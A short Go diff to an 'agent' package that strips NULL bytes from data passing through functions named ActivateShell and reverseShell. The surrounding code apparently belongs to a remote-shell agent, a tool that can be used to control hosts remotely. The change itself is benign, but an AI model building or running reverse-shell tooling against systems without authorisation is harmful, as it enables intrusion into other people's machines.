@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 	"log"
@@ -75,6 +76,7 @@ func ActivateShell() {
 					cancel()
 					return
 				}
+				data = bytes.Trim(data, "\x00")
 				recvcc <- data
 			}
 		}
@@ -145,6 +147,7 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 	go func() {
 		defer func() { cancel() }()
 		for incoming := range recv {
+			incoming = bytes.Trim(incoming, "\x00") // trim NULL bytes
 			select {
 			case <-ctx.Done():
 				return
